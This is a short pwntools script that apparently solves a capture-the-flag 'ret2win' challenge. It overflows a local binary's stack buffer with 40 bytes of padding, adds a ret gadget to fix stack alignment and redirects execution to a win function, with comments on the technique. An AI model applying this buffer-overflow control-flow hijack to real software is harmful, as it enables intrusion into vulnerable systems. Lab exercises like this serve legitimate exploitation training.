from pwn import *

# context.terminal = ['bash', '-c']

payload = b'a'*40 + p64(0x40053e) + p64(0x400756)
#here i was runnig into stack misalignment issue and adding a ret gadget before calling
#ret2win aligned the stack, this problem occurs when there is printf() or system()
p = process('./ret2win')
#gdb.attach(p)
p.send(payload)
p.interactive()
# flag = p.recvall()
# print(flag.decode())
# output = p.recvall(timeout=2)  # Add a timeout to avoid hanging
# print(output.decode())

# 0x0000000000400697  main
# 0x00000000004006e8  pwnme
# 0x0000000000400756  ret2win